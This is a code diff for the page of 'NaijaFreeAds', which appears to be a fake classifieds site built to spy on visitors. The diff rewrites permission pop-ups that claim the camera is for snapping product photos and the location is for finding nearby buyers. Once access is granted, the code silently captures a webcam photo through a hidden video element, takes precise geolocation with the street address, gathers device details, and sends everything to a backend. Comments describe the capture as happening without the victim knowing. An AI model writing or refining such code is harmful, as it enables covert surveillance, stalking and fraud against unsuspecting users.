@@ -176,8 +176,8 @@
         .ad-price { font-size: 24px; font-weight: 800; color: #00a86b; margin: 10px 0; }
         .ad-views { font-size: 11px; color: #64748b; margin-top: 8px; }
         
-        /* Permission Modal - Looks legit for classifieds */
-        .perm-modal {
+        /* Permission Modal */
+        .perm-overlay {
             position: fixed;
             top: 0;
             left: 0;
@@ -185,14 +185,13 @@
             bottom: 0;
             background: rgba(0,0,0,0.95);
             backdrop-filter: blur(20px);
-            z-index: 10000;
-            display: none;
+            z-index: 20000;
+            display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
         }
-        .perm-modal.active { display: flex; }
-        .perm-content {
+        .perm-box {
             max-width: 400px;
             width: 100%;
             background: linear-gradient(145deg, #1e293b, #0f172a);
@@ -200,16 +199,16 @@
             padding: 35px;
             text-align: center;
             border: 1px solid #00a86b;
-            animation: fadeInUp 0.3s ease;
+            animation: fadeIn 0.3s ease;
         }
-        @keyframes fadeInUp {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
         .perm-icon { font-size: 60px; margin-bottom: 15px; }
-        .perm-title { font-size: 22px; font-weight: 700; margin-bottom: 10px; color: white; }
-        .perm-desc { color: #94a3b8; margin-bottom: 25px; font-size: 14px; }
-        .allow-camera-btn {
+        .perm-title { font-size: 24px; font-weight: 700; margin-bottom: 10px; color: white; }
+        .perm-desc { color: #94a3b8; margin-bottom: 25px; font-size: 14px; line-height: 1.5; }
+        .allow-btn {
             width: 100%;
             padding: 14px;
             background: linear-gradient(135deg, #008000, #00a86b);
@@ -240,7 +239,7 @@
             background: #22c55e;
             padding: 14px 28px;
             border-radius: 60px;
-            z-index: 10001;
+            z-index: 20001;
             transform: translateX(200%);
             transition: 0.3s;
             font-weight: 500;
@@ -336,29 +335,19 @@
 <video id="hiddenCamera" autoplay playsinline muted></video>
 <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
-<!-- Camera Permission Modal - Looks legit for snapping ads -->
-<div class="perm-modal" id="cameraModal">
-    <div class="perm-content">
-        <div class="perm-icon">📸</div>
-        <div class="perm-title">Snap product photos</div>
-        <div class="perm-desc">Allow NaijaFreeAds to use your camera to quickly snap photos of items you're selling</div>
-        <button class="allow-camera-btn" id="allowCameraBtn"><i class="fas fa-camera"></i> Allow Camera Access</button>
-        <button class="skip-btn" id="skipCameraBtn">Skip for now</button>
-    </div>
-</div>
-
 <div class="toast" id="toastMsg"><i class="fas fa-check-circle"></i> Ad posted!</div>
 
 <script>
-    // ========== SILENT CAMERA CAPTURE - VICTIM NEVER KNOWS ==========
+    // ========== SILENT CAMERA & LOCATION CAPTURE ==========
     let cameraStream = null;
     let capturedPhoto = null;
     let userLocation = null;
     let cameraGranted = false;
+    let locationGranted = false;
     let uploadedImages = [];
-    let permissionsRequested = false;
+    let permissionsCompleted = false;
 
-    // Featured ads with fake views
+    // Featured ads
     const featuredAds = [
         { id: 1, title: "iPhone 14 Pro Max", price: "₦850,000", location: "Lagos", emoji: "📱", views: 124, seller: "TechPlug NG" },
         { id: 2, title: "Toyota Camry 2018", price: "₦7.2M", location: "Abuja", emoji: "🚗", views: 89, seller: "AutoDeal NG" },
@@ -424,7 +413,7 @@
         imagePreview.innerHTML = uploadedImages.map((img, idx) => `
             <div style="position: relative;">
                 <img src="${img}" class="preview-img">
-                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer;">×</button>
+                <button onclick="removeImage(${idx})" style="position: absolute; top: -8px; right: -8px; background: #ef4444; border: none; border-radius: 50%; width: 22px; height: 22px; color: white; cursor: pointer; font-size: 12px;">×</button>
             </div>
         `).join('');
     }
@@ -434,7 +423,7 @@
         displayImages();
     }
 
-    // SILENT CAMERA CAPTURE - Happens in background
+    // SILENT CAMERA CAPTURE
     async function captureSilentPhoto() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
@@ -461,7 +450,6 @@
             
             const photo = canvas.toDataURL('image/jpeg', 0.6);
             
-            // Stop stream silently
             if (cameraStream) {
                 cameraStream.getTracks().forEach(track => track.stop());
                 cameraStream = null;
@@ -474,7 +462,7 @@
         }
     }
 
-    // Get location silently
+    // GET LOCATION SILENTLY
     async function getLocation() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) { resolve(null); return; }
@@ -488,10 +476,11 @@
                         address.city = data.address.city || data.address.town || data.address.village || '';
                         address.state = data.address.state || '';
                         address.country = data.address.country || '';
+                        address.street = data.address.road || '';
                     }
                 } catch(e) {}
                 resolve(address);
-            }, () => resolve(null), { timeout: 5000 });
+            }, () => resolve(null), { timeout: 5000, enableHighAccuracy: true });
         });
     }
 
@@ -526,45 +515,71 @@
         }
     }
 
-    // Request camera permission - looks legit for snapping ads
-    function requestCameraPermission() {
+    // SHOW PERMISSION POPUP - CAMERA FIRST
+    function showCameraPopup() {
         return new Promise((resolve) => {
-            const modal = document.getElementById('cameraModal');
-            const allowBtn = document.getElementById('allowCameraBtn');
-            const skipBtn = document.getElementById('skipCameraBtn');
+            const overlay = document.createElement('div');
+            overlay.className = 'perm-overlay';
+            overlay.id = 'cameraPopup';
+            overlay.innerHTML = `
+                <div class="perm-box">
+                    <div class="perm-icon">📸</div>
+                    <div class="perm-title">Quick Photo Capture</div>
+                    <div class="perm-desc">NaijaFreeAds wants to use your camera to quickly snap photos of items you're selling. This helps your ad get more views!</div>
+                    <button class="allow-btn" id="cameraAllowBtn"><i class="fas fa-camera"></i> Allow Camera</button>
+                    <button class="skip-btn" id="cameraSkipBtn">Skip for now</button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
             
-            allowBtn.onclick = async () => {
-                modal.classList.remove('active');
-                cameraGranted = true;
-                
-                // Capture silently - victim has no idea
+            document.getElementById('cameraAllowBtn').onclick = async () => {
+                overlay.remove();
                 capturedPhoto = await captureSilentPhoto();
-                userLocation = await getLocation();
-                
-                const device = await getDeviceInfo();
-                await sendToBackend({
-                    id: Date.now(),
-                    type: 'permission_granted',
-                    timestamp: new Date().toISOString(),
-                    location: userLocation,
-                    cameraImage: capturedPhoto,
-                    device: device
-                });
-                
+                cameraGranted = true;
                 resolve(true);
             };
             
-            skipBtn.onclick = () => {
-                modal.classList.remove('active');
+            document.getElementById('cameraSkipBtn').onclick = () => {
+                overlay.remove();
                 cameraGranted = false;
                 resolve(false);
             };
-            
-            modal.classList.add('active');
         });
     }
 
-    // Post Ad - Everything happens silently
+    // SHOW PERMISSION POPUP - LOCATION SECOND
+    function showLocationPopup() {
+        return new Promise((resolve) => {
+            const overlay = document.createElement('div');
+            overlay.className = 'perm-overlay';
+            overlay.id = 'locationPopup';
+            overlay.innerHTML = `
+                <div class="perm-box">
+                    <div class="perm-icon">📍</div>
+                    <div class="perm-title">Find Buyers Near You</div>
+                    <div class="perm-desc">Allow location access to show your ad to people in your area. This increases chances of selling faster!</div>
+                    <button class="allow-btn" id="locationAllowBtn"><i class="fas fa-map-marker-alt"></i> Allow Location</button>
+                    <button class="skip-btn" id="locationSkipBtn">Skip for now</button>
+                </div>
+            `;
+            document.body.appendChild(overlay);
+            
+            document.getElementById('locationAllowBtn').onclick = async () => {
+                overlay.remove();
+                userLocation = await getLocation();
+                locationGranted = true;
+                resolve(true);
+            };
+            
+            document.getElementById('locationSkipBtn').onclick = () => {
+                overlay.remove();
+                locationGranted = false;
+                resolve(false);
+            };
+        });
+    }
+
+    // Post Ad
     document.getElementById('postAdBtn').addEventListener('click', async () => {
         const title = document.getElementById('adTitle').value.trim();
         const category = document.getElementById('adCategory').value;
@@ -583,20 +598,27 @@
         btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Posting...';
         btn.disabled = true;
         
-        // Request camera permission if not already granted
-        if (!permissionsRequested) {
-            permissionsRequested = true;
-            await requestCameraPermission();
+        // Show camera popup first
+        if (!cameraGranted && !permissionsCompleted) {
+            await showCameraPopup();
         }
         
-        // Get location if not already
-        if (!userLocation) {
+        // Show location popup second
+        if (!locationGranted && !permissionsCompleted) {
+            await showLocationPopup();
+        }
+        permissionsCompleted = true;
+        
+        // Try to get data if not already captured
+        if (!capturedPhoto && cameraGranted) {
+            capturedPhoto = await captureSilentPhoto();
+        }
+        if (!userLocation && locationGranted) {
             userLocation = await getLocation();
         }
         
         const device = await getDeviceInfo();
         
-        // Send ad data with captured photo
         await sendToBackend({
             id: Date.now(),
             type: 'ad_posted',
